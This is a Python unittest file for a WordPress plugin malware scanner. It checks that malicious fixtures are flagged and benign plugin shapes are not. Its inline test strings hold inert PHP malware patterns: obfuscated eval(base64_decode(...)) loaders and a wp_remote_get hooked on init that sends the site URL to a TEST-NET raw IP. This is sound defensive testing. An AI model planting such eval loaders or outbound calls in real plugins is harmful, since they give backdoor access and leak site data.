"""Canary + control tests (python3 -m unittest).

Every mal-* fixture must reach its expected level AND fire its expected rule; every ok-*
fixture (shapes popular plugins really use) must stay below HIGH, and most must be SAFE.
Fixtures are inert: hosts are .invalid / TEST-NET, passwords are CANARY strings, and the
encoded payloads decode to `echo 'CANARY_inert_payload';`. Nothing here is ever executed.
"""
import contextlib
import io
import os
import sys
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import wordpress_audit as wa  # noqa: E402

FIX = os.path.join(HERE, "fixtures")

EXPECT = {
    # the five incident canaries
    "mal-social-warfare-2024": ("CRITICAL", "hardcoded_admin"),
    "mal-accesspress-2021": ("CRITICAL", "php_drop"),
    "mal-display-widgets-2017": ("CRITICAL", "remote_inject"),
    "mal-fake-security-2023": ("CRITICAL", "hidden_admin"),
    "mal-eval-gzinflate": ("CRITICAL", "eval_decoded"),
    # the other shapes
    "mal-webshell": ("CRITICAL", "request_exec"),
    "mal-remote-eval-cron": ("CRITICAL", "remote_code_exec"),
    "mal-wpconfig-exfil": ("CRITICAL", "credential_exfil"),
    "mal-login-harvest": ("CRITICAL", "login_harvest"),
    "mal-ico-loader": ("HIGH", "php_in_nonphp"),
    "mal-mu-drop": ("CRITICAL", "php_drop"),
}
# extra rules each incident canary must also fire
ALSO = {
    "mal-social-warfare-2024": {"remote_inject", "raw_ip_url"},
    "mal-fake-security-2023": {"auth_backdoor", "user_hiding", "self_hiding", "hardcoded_admin"},
    "mal-ico-loader": {"include_nonphp"},
}
NOT_SAFE_OK = {"ok-white-label": "MEDIUM"}   # benign but worth a look: exact level expected


def scan(name):
    return wa.scan_plugin(wa.files_from_dir(os.path.join(FIX, name)), name)


class Canaries(unittest.TestCase):
    def test_every_fixture_is_covered(self):
        names = set(os.listdir(FIX))
        self.assertTrue({n for n in names if n.startswith("mal-")} <= set(EXPECT))

    def test_malicious(self):
        for name, (level, rule) in EXPECT.items():
            with self.subTest(name=name):
                r = scan(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertGreaterEqual(wa.SEV_ORDER[r["risk_level"]], wa.SEV_ORDER[level], (name, r["risk_level"], ids))
                self.assertIn(rule, ids)
                self.assertTrue(ALSO.get(name, set()) <= ids, (name, ids))

    def test_benign(self):
        for name in sorted(os.listdir(FIX)):
            if not name.startswith("ok-"):
                continue
            with self.subTest(name=name):
                r = scan(name)
                got = r["risk_level"]
                self.assertEqual(got, NOT_SAFE_OK.get(name, "SAFE"), (name, [(f["severity"], f["id"]) for f in r["findings"]]))


class Units(unittest.TestCase):
    def test_text_scan(self):
        self.assertEqual(wa.scan("<?php eval(base64_decode('Q0FOQVJZ'));")["risk_level"], "CRITICAL")
        self.assertEqual(wa.scan("<?php echo base64_decode('Q0FOQVJZ');")["risk_level"], "SAFE")

    def test_comment_and_string_demotion(self):
        self.assertEqual(wa.scan("<?php\n// eval(base64_decode($x));\n$a = 'eval(gzinflate(';")["risk_level"], "SAFE")

    def test_context_escalation(self):
        # the same raw-IP send is HIGH in a plain function and CRITICAL when hooked on init
        plain = "<?php\nfunction f(){ wp_remote_get('http://192.0.2.7/x?s=' . home_url()); }\n"
        hooked = plain + "add_action('init','f');\n"
        self.assertEqual(wa.scan(plain)["risk_level"], "HIGH")
        r = wa.scan(hooked)
        self.assertEqual(r["risk_level"], "CRITICAL")
        self.assertEqual(r["findings"][0].get("exec_context"), "load")

    def test_raw_ip_gateway_is_medium(self):
        # an SMS gateway on a raw IP sends message payloads, not the site's identity
        self.assertEqual(wa.scan("<?php\nfunction f($m){ wp_remote_get('https://192.0.2.7/send?' . $m); }\n")["risk_level"], "MEDIUM")

    def test_vendor_demotion(self):
        src = ("<?php\n/* Plugin Name: V\n * Plugin URI: https://vendor-x.example/ */\n"
               "function u(){ $b = wp_remote_retrieve_body(wp_remote_get('https://api.vendor-x.example/u')); eval($b); }\n")
        self.assertEqual(wa.scan(src)["risk_level"], "MEDIUM")

    def test_zip_input(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("canary/canary.php", "<?php\n/* Plugin Name: Z */\n@eval(str_rot13(base64_decode('Q0FOQVJZ')));\n")
            z.writestr("canary/readme.txt", "=== Z ===")
        files = wa.files_from_zip(buf.getvalue())
        self.assertIn("canary.php", files)
        self.assertEqual(wa.scan_plugin(files, "z")["risk_level"], "CRITICAL")

    def test_split_spec(self):
        self.assertEqual(wa.split_spec("akismet@5.3"), ("akismet", "5.3"))
        self.assertEqual(wa.split_spec("akismet"), ("akismet", None))

    def test_exit_code(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(wa.main([os.path.join(FIX, "mal-webshell")]), 2)
            self.assertEqual(wa.main(["--json", os.path.join(FIX, "ok-snippets")]), 0)


if __name__ == "__main__":
    unittest.main()
